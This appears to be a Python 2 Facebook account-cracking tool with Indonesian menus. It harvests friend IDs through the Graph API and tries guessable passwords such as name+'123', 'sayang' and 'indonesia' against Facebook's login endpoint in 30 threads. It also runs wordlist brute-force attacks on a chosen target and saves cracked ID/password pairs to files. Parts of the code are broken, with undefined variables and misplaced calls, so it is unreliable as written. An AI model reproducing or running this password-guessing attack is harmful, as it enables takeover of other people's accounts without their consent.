#!/usr/bin/python2
#coding=utf-8


import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]

def keluar():
	print "\033[1;91m[!] \x1b[1;91mExit"
	os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(00000.1)


##### LOGO #####
logo = """
\033[1;31m _________                             __
\033[1;31m \_   ___ \  _______  _____     ____  |  | __
\033[1;31m  /    \ \/ \_  __  \ \__  \  _/ ___\ |  |/ /
\033[1;37m  \     \____ |  | \/ / __ \_ \  \___ |    <
\033[1;37m   \______  / |__|   (____  /  \___  >|__|_ \\
\033[1;37m          \/              \/       \/      \/
\033[1;34m───────────────────────────────────────────
\033[1;31m(\033[1;37m•\033[1;31m) \033[1;33mAuthor   \033[1;31m: \033[1;37mZAMUEL-MX
\033[1;31m(\033[1;37m•\033[1;31m) \033[1;33mGithub   \033[1;31m: \033[1;37mGithub.com/ZAMUEL-MX
\033[1;31m(\033[1;37m•\033[1;31m) \033[1;33mFacebook \033[1;31m: \033[1;37mFacebook.com/zamuel.gans
\033[1;34m───────────────────────────────────────────"""

def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\x1b[1;93mPlease Wait \x1b[1;93m"+o),;sys.stdout.flush();time.sleep(00000.1)


back = 0
berhasil = []
cekpoint = []
oks = []
id = []
listgrup = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

os.system("clear")
print """
\033[1;91m ______  ___  ___  ___ _   _  _____  _
\033[1;91m|___  / / _ \ |  \/  || | | ||  ___|| |
\033[1;91m   / / / /_\ \| .  . || | | || |__  | |
\033[1;37m  / /  |  _  || |\/| || | | ||  __| | |
\033[1;37m / /___| | | || |  | || |_| || |___ | |____
\033[1;37m\ ____/\_| |_/\_|  |_/ \___/ \____/ \_____/
\033[1;34m───────────────────────────────────────────
\033[1;31m(\033[1;37m•\033[1;31m) \033[1;33mAuthor   \033[1;31m: \033[1;37mZAMUEL-MX
\033[1;31m(\033[1;37m•\033[1;31m) \033[1;33mGithub   \033[1;31m: \033[1;37mGithub.com/ZAMUEL-MX
\033[1;31m(\033[1;37m•\033[1;31m) \033[1;33mFacebook \033[1;31m: \033[1;37mFacebook.com/zamuel.gans
\033[1;34m───────────────────────────────────────────"""

CorrectUsername = "zml"
CorrectPassword = "zml"

loop = 'true'
while (loop == 'true'):
    username = raw_input("\033[1;91m(•) \033[1;93mUsername \033[1;91m: \033[1;97m")
    if (username == CorrectUsername):
    	password = raw_input("\033[1;91m(•) \033[1;93mPassword \033[1;91m: \033[1;97m")
        if (password == CorrectPassword):
            print "Login Succes " + username
            loop = 'false'
        else:
            print "Password Salah Goblok"
	    print "Silahkan Cari di Github"
            os.system('xdg-open https://github.com/zamxyz/crack')
    else:
        print "Username Salah Ngentod"
	print "Silahkan Cari Di Github"
        os.system('xdg-open https://github.com/zamxyz/crack')

def login():
    os.system('clear')
    print logo
    jalan("\033[1;91mLOGIN ACCESS TOKEN FACEBOOK !!!")
    print 
    toket = raw_input("\033[1;91m(\033[1;97m?\033[1;91m)\033[1;93mToken \033[1;91m:\033[1;97m ")
    try:
        otw = requests.get('https://graph.facebook.com/me?access_token=' + toket)
        a = json.loads(otw.text)
        nama = a['name']
        zedd = open('login.txt', 'w')
        zedd.write(toket)
        zedd.close()
        print '\033[1;93m(\033[1;92m!\033[1;93m)\033[1;92m Login Berhasil Tod ! '
	os.system('xdg-open https://github.com/zamxyz')
    login()
    except KeyError:
        print "\033[1;93m(\033[1;91m!\033[1;93m) \033[1;91mToken salah !"
	time.sleep(1.7)
	login()
        
def menu():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('clear')
		print"\033[1;93m[!] \x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
	except KeyError:
		os.system('clear')
		print"\033[1;93m[!] \033[1;91mIt seems that your account has a checkpoint"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	except requests.exceptions.ConnectionError:
		print"\033[1;93m[!] \x1b[1;91mThere is no internet connection"
		keluar()
		perbarui()

	os.system("clear")
	print logo
	print "\033[1;37m(\033[1;31m•\033[1;37m)\033[1;33m Nama Akun\033[1;91m     :\033[1;37m "+nama
	print "\033[1;37m(\033[1;31m•\033[1;37m)\033[1;33m User ID\033[1;91m       :\033[1;37m "+id
	print "\033[1;37m(\033[1;31m•\033[1;37m)\033[1;33m Tanggal Lahir\033[1;91m :\033[1;37m "+ a['birthday']
	print "\033[1;34m───────────────────────────────────────────"
	print "\033[1;31(\033[1;37m01\033[1;31m)\033[1;33m Start Cracking"
	print "\033[1;31m(\033[1;31m00\033[1;31m)\033[1;31m Logout"
	print "\033[1;34m───────────────────────────────────────────"
	pilih()


def pilih():
	unikers = raw_input("\033[1;33mPilih \033[1;31m:\033[1;37m ")
	if unikers =="":
		print "\033[1;97m(\033[1;91m!\033[1;97m)\033[1;91m Isi Yg Benar Tolol !!"
		pilih()
	elif unikers =="1":
		super()
	elif unikers =="0":
		jalan('Token Removed')
		os.system('rm -rf login.txt')
		keluar()
	else:
		print "\033[1;97m(\033[1;91m!\033[1;97m)\033[1;93m Isi Yg Benar Sayang !"
		pilih()


def super():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] \x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	os.system('clear')
	print logo
	print "\033[1;31m(\033[1;37m01\033[1;31m)\033[1;37m.\033[1;33m Crack ID Dari Daftar Teman"
	print "\033[1;31m(\033[1;37m02\033[1;31m)\033[1;37m.\033[1;33m Crack ID Publik"
	print "\033[1;31m(\033[1;37m03\033[1;31m)\033[1;37m.\033[1;33m Crack Akun Target"
	print "\033[1;31m(\033[1;37m00\033[1;31m)\033[1;37m.\033[1;31m Kembali"
	print "\033[1;34m───────────────────────────────────────────"
	pilih_super()

def pilih_super():
	peak = raw_input("\033[1;33mPilih \033[1;31m:\033[1;37m ")
	if peak =="":
		print "\033[1;91m(\033[1;97m!\033[1;91m)\033[1;91m Isi Yg Benar Tolol !"
		pilih_super()
	elif peak =="1":
		os.system('clear')
		print logo
		print
		jalan('\033[1;91m(\033[1;37m•\033[1;31m) \033[1;92mGetting ID \033[1;92m...')
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif peak =="2":
		os.system('clear')
		print logo
		print 
		idt = raw_input("\033[1;31m(\033[1;37m•\033[1;31m) \033[1;93mEnter ID \033[1;91m: \033[1;97m")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"\033[1;91m(\033[1;97m•\033[1;93m)\033[1;93m Name\033[1;91m :\033[1;97m "+op["name"]
		except KeyError:
			print"\033[1;91m[!] \x1b[1;91mID Not Found!"
			raw_input("\n\033[1;97m(\033[1;93mBack\033[1;97m]")
			super()
		jalan('\033[1;91m(\033[1;97m•\033[1;91m)\033[1;93mGetting ID \033[1;93m...')
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif peak =="3":
		os.system('clear')
		print logo
		brute()	
	elif peak =="0":
		menu()
	else:
		print "\033[1;91m(\033[1;91m•\033[1;97) \x1b[1;91mFill in correctly"
		pilih_super()
	
	print "\033[1;31m(\033[1;37m•\033[1;91m) \033[1;33mTotal ID \033[1;91m: \033[1;97m"+str(len(id))
	jalan('\033[1;31m{\033[1;37m•\033[1;91m) \033[1;33mStarting \033[1;93m...')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;91m(\033[1;97m•\033[1:91m) \033[1;93mCracking \033[1;97m"+o),;sys.stdout.flush();time.sleep(1)
	jalan("\nCrack Sedang Berjalan..." )
	print "\033[1;34m───────────────────────────────────────────"
	print
	def main(arg):
		global cekpoint,oks
		user = arg
		try:
			os.mkdir('out')
		except OSError:
			pass
		try:
			x = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
			z = json.loads(a.text)
			pass1 = b['first_name']+'123'
	 		data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if 'access_token' in q:
     
				x = requests.get("https://graph.facebook.com/"+user+"?access_token="+w['access_token'])
				z = json.loads(x.text)
				print '\x1c\033[1;93m[✖] \x1c\033[1;91mCheckpoint'
				print '\x1c\033[1;91m[✴] \x1c\033[1;93mName \x1c\033[1;94m    : \x1c\033[1;97m' + c['name']
				print '\x1c\033[1;91m[➹] \x1c\033[1;93mID \x1c\033[1;94m      : \x1c\033[1;97m' + user
				print '\x1c\033[1;91m[➹] \x1c\033[1;93mPassword \x1c\033[1;94m: \x1c\033[1;97m' + pass1 + '\n'
				cek = open("out/super_cp.txt", "a")
				cek.write("ID:" +user+ " Pw:" +pass1+"\n")
				cek.close()
				cekpoint.append(user+pass1)
			else:
				pass2 = b['last_name']+'123'
				data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
				q = json.load(data)
				if 'access_token' in q:
       	
						x = requests.get("https://graph.facebook.com/"+user+"?access_token="+w['access_token'])
						z = json.loads(x.text)
						print '\x1c\033[1;93m[✔] \x1c\033[1;92mBerhasil'
						print '\x1c\033[1;93m[✴] \x1c\033[1;97mName \x1c\033[1;91m    : \x1c\033[1;92m' + c['name']
						print '\x1c\033[1;93m[➹] \x1c\033[1;97mID \x1c\033[1;91m      : \x1c\033[1;92m' + user
						print '\x1c\033[1;93m[➹] \x1c\033[1;97mPassword \x1c\033[1;91m: \x1c\033[1;92m' + pass2 + '\n'
						oks.append(user+pass2)
				else:
							if 'www.facebook.com' in w['error_msg']:
									print '\x1c\033[1;93m[✖] \x1c\033[1;91mCheckpoint'
									print '\x1c\033[1;91m[✴] \x1c\033[1;93mName \x1c\033[1;94m    : \x1c\033[1;97m' + c['name']
									print '\x1c\033[1;91m[➹] \x1c\033[1;93mID \x1c\033[1;94m      : \x1c\033[1;97m' + user
									print '\x1c\033[1;91m[➹] \x1c\033[1;93mPassword \x1c\033[1;94m: \x1c\033[1;97m' + pass2 + '\n'
									cek = open("out/super_cp.txt", "a")
									cek.write("ID:" +user+ " Pw:" +pass2+"\n")
									cek.close()
									cekpoint.append(user+pass2)
							else:
									pass3 = b['first_name'] + '12345'
									data =urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									q = json.load(data)
									if 'access_token' in q:
     
								   		 x = requests.get("https://graph.facebook.com/"+user+"?access_token="+w['access_token'])
									 	 z = json.loads(x.text)
										 print '\x1c\033[1;93m[✔] \x1c\033[1;92mBerhasil'
										 print '\x1c\033[1;93m[✴] \x1c\033[1;97mName \x1c\033[1;91m    : \x1c\033[1;92m' + c['name']
										 print '\x1c\033[1;93m[➹] \x1c\033[1;97mID \x1c\033[1;91m      : \x1c\033[1;92m' + user
										 print '\x1c\033[1;93m[➹] \x1c\033[1;97mPassword \x1c\033[1;91m: \x1c\033[1;92m' + pass3 + '\n'
										 oks.append(user+pass3)
									else:
											if 'www.facebook.com' in w['error_msg']:
												print '\x1c\033[1;93m[✖] \x1c\033[1;91mCheckpoint'
												print '\x1c\033[1;91m[✴] \x1c\033[1;93mName \x1c\033[1;94m    : \x1c\033[1;97m' + c['name']
												print '\x1c\033[1;91m[➹] \x1c\033[1;93mID \x1c\033[1;94m      : \x1c\033[1;97m' + user
												print '\x1c\033[1;91m[➹] \x1c\033[1;93mPassword \x1c\033[1;94m: \x1c\033[1;97m' + pass3 + '\n'
												cek = open("out/super_cp.txt", "a")
												cek.write("ID:" +user+ " Pw:" +pass3+"\n")
												cek.close()
												cekpoint.append(user+pass3)
											else:
												pass4 = 'sayang'
												data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
												q = json.load(data)
												if 'access_token' in q:
       
													x = requests.get("https://graph.facebook.com/"+user+"?access_token="+w['access_token'])
													z = json.loads(x.text)
													print '\x1c\033[1;93m[✔] \x1c\033[1;92mBerhasil'
													print '\x1c\033[1;93m[✴] \x1c\033[1;97mName \x1c\033[1;91m    : \x1c\033[1;92m' + c['name']
													print '\x1c\033[1;93m[➹] \x1c\033[1;97mID \x1c\033[1;91m      : \x1c\033[1;92m' + user
													print '\x1c\033[1;93m[➹] \x1c\033[1;97mPassword \x1c\033[1;91m: \x1c\033[1;92m' + pass4 + '\n'
													oks.append(user+pass4)
												else:
													if 'www.facebook.com' in w['error_msg']:
														print '\x1c\033[1;93m[✖] \x1c\033[1;91mCheckpoint'
														print '\x1c\033[1;91m[✴] \x1c\033[1;93mName \x1c\033[1;94m    : \x1c\033[1;97m' + c['name']
														print '\x1c\033[1;91m[➹] \x1c\033[1;93mID \x1c\033[1;94m      : \x1c\033[1;97m' + user
														print '\x1c\033[1;91m[➹] \x1c\033[1;93mPassword \x1c\033[1;94m: \x1c\033[1;97m' + pass4 + '\n'
														cek = open("out/super_cp.txt", "a")
														cek.write("ID:" +user+ " Pw:" +pass4+"\n")
														cek.close()
														cekpoint.append(user+pass4)
													else:
														pass5 = 'bangsat'
														data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
														q = json.load(data)
														if 'access_token' in q:
        
															x = requests.get("https://graph.facebook.com/"+user+"?access_token="+w['access_token'])
															z = json.loads(x.text)
															print '\x1c\033[1;93m[✔] \x1c\033[1;92mBerhasil'
															print '\x1c\033[1;93m[✴] \x1c\033[1;97mName \x1c\033[1;91m    : \x1c\033[1;92m' + c['name']
															print '\x1c\033[1;93m[➹] \x1c\033[1;97mID \x1c\033[1;91m      : \x1c\033[1;92m' + user
															print '\x1c\033[1;93m[➹] \x1c\033[1;97mPassword \x1c\033[1;91m: \x1c\033[1;92m' + pass5 + '\n'
															oks.append(user+pass5)
														else:
															if 'www.facebook.com' in w['error_msg']:
																print '\x1c\033[1;93m[✖] \x1c\033[1;91mCheckpoint'
																print '\x1c\033[1;91m[✴] \x1c\033[1;93mName \x1c\033[1;94m    : \x1c\033[1;97m' + c['name']
																print '\x1c\033[1;91m[➹] \x1c\033[1;93mID \x1c\033[1;94m      : \x1c\033[1;97m' + user
																print '\x1c\033[1;91m[➹] \x1c\033[1;93mPassword \x1c\033[1;94m: \x1c\033[1;97m' + pass5 + '\n'
																cek = open("out/super_cp.txt", "a")
																cek.write("ID:" +user+ " Pw:" +pass5+"\n")
																cek.close()
																cekpoint.append(user+pass5)
															else:
																pass6 = 'kontol'
																data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
																q = json.load(data)
																if 'access_token' in q:
        
																	x = requests.get("https://graph.facebook.com/"+user+"?access_token="+w['access_token'])
																	z = json.loads(x.text)
																	print '\x1c\033[1;93m[✔] \x1c\033[1;92mBerhasil'
																	print '\x1c\033[1;93m[✴] \x1c\033[1;97mName \x1c\033[1;91m    : \x1c\033[1;92m' + c['name']
																	print '\x1c\033[1;93m[➹] \x1c\033[1;97mID \x1c\033[1;91m      : \x1c\033[1;92m' + user
																	print '\x1c\033[1;93m[➹] \x1c\033[1;97mPassword \x1c\033[1;91m: \x1c\033[1;92m' + pass6 + '\n'
																	oks.append(user+pass6)
																else:
																	if 'www.facebook.com' in w['error_msg']:
																		print '\x1c\033[1;93m[✖] \x1c\033[1;91mCheckpoint'
																		print '\x1c\033[1;91m[✴] \x1c\033[1;93mName \x1c\033[1;94m    : \x1c\033[1;97m' + c['name']
																		print '\x1c\033[1;91m[➹] \x1c\033[1;93mID \x1c\033[1;94m      : \x1c\033[1;97m' + user
																		print '\x1c\033[1;91m[➹] \x1c\033[1;93mPassword \x1c\033[1;94m: \x1c\033[1;97m' + pass6 + '\n'
																		cek = open("out/super_cp.txt", "a")
																		cek.write("ID:" +user+ " Pw:" +pass6+"\n")
																		cek.close()
																		cekpoint.append(user+pass6)
																	else:
																		pass7 = 'indonesia'
																		data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
																		q = json.load(data)
																		if 'access_token' in q:
       
																			x = requests.get("https://graph.facebook.com/"+user+"?access_token="+w['access_token'])
																			z = json.loads(x.text)
																			print '\x1c\033[1;93m[✔] \x1c\033[1;92mBerhasil'
																			print '\x1c\033[1;93m[✴] \x1c\033[1;97mName \x1c\033[1;91m    : \x1c\033[1;92m' + c['name']
																			print '\x1c\033[1;93m[➹] \x1c\033[1;97mID \x1c\033[1;91m   : \x1c\033[1;92m' + user
																			print '\x1c\033[1;93m[➹] \x1c\033[1;97mPassword \x1c\033[1;91m: \x1c\033[1;92m' + pass7 + '\n'
																			oks.append(user+pass7)
																		else:
																			if 'www.facebook.com' in w['error_msg']:
																				print '\x1c\033[1;93m[✖] \x1c\033[1;91mCheckpoint'
																				print '\x1c\033[1;91m[✴] \x1c\033[1;93mName \x1c\033[1;94m    : \x1c\033[1;97m' + c['name']
																				print '\x1c\033[1;91m[➹] \x1c\033[1;93mID \x1c\033[1;94m      : \x1c\033[1;97m' + user
																				print '\x1c\033[1;91m[➹] \x1c\033[1;93mPassword \x1c\033[1;94m: \x1c\033[1;97m' + pass7 + '\n'
																				cek = open("out/super_cp.txt", "a")
																				cek.write("ID:" +user+ " Pw:" +pass7+"\n")
																				cek.close()
																				cekpoint.append(user+pass7)
																		
															
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print '\033[1;92mProcess Has Been Completed'
	print"\033[1;91mTotal OK/\x1b[1;93mCP \033[1;91m: \033[1;91m"+str(len(oks))+"\033[1;93m/\033[1;96m"+str(len(cekpoint))
	print 
	raw_input("\n\033[1;93m[\033[1;91mBack\033[1;93m]")
	os.system('clear')
	
def brute():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\033[1;97m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(0.5)
        login()
    else:
        os.system('clear')
        print logo
        print
        try:
            email = raw_input('\033[1;93m[+] \033[1;97mID\033[1;97m/\033[1;97mEmail \033[1;97mTarget \033[1;97m:\033[1;97m ')
            passw = raw_input('\033[1;93m[+] \033[1;97mWordlist \033[1;97mext(word.txt) \033[1;97m: \033[1;97m')
            total = open(passw, 'r')
            total = total.readlines()
            print 
            print '\033[1;93m[\033[1;97m\xe2\x9c\x93\033[1;93m] \033[1;97mTarget \033[1;97m:\033[1;97m ' + email
            print '\033[1;93m[+] \033[1;97mTotal\033[1;97m ' + str(len(total)) + ' \033[1;97mPassword'
            jalan('\033[1;93m[\xe2\x9c\xba] \033[1;97mPlease wait \033[1;97m...')
            sandi = open(passw, 'r')
            for pw in sandi:
                try:
                    pw = pw.replace('\n', '')
                    sys.stdout.write('\r\033[1;93m[\033[1;97m\xe2\x9c\xb8\033[1;93m] \033[1;97mTry \033[1;97m' + pw)
                    sys.stdout.flush()
                    data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + email + '&locale=en_US&password=' + pw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    mpsh = json.loads(data.text)
                    if 'access_token' in mpsh:
                        dapat = open('Brute.txt', 'w')
                        dapat.write(email + ' | ' + pw + '\n')
                        dapat.close()
                        print '\n\033[1;97m[+] \033[1;97mFounded.'
                        print 52 * '\033[1;97m\xe2\x95\x90'
                        print '\033[1;93m[\xe2\x9e\xb9] \033[1;97mUsername \033[1;91m:\033[1;97m ' + email
                        print '\033[1;93m[\xe2\x9e\xb9] \033[1;97mPassword \033[1;91m:\033[1;97m ' + pw
                        keluar()
                    else:
                        if 'www.facebook.com' in mpsh['error_msg']:
                            ceks = open('Brutecekpoint.txt', 'w')
                            ceks.write(email + ' | ' + pw + '\n')
                            ceks.close()
                            print '\n\033[1;93m[+] \033[1;91mFounded.'
                            print 
                            print '\033[1;91m[!] \033[1;91mAccount Maybe Checkpoint'
                            print '\033[1;93m[\xe2\x9e\xb9] \033[1;97mUsername \033[1;91m:\033[1;97m ' + email
                            print '\033[1;93m[\xe2\x9e\xb9] \033[1;97mPassword \033[1;91m:\033[1;97m ' + pw
                            keluar()
                except requests.exceptions.ConnectionError:
                    print '\033[1;97m[!] Connection Error'
                    time.sleep(1)

        except IOError:
            print '\033[1;97m[!] File not found...'
            print """\n\033[1;97m[!] \033[1;97mLooks like you don't have a wordlist"""
            super()

if __name__ == '__main__':
	login()
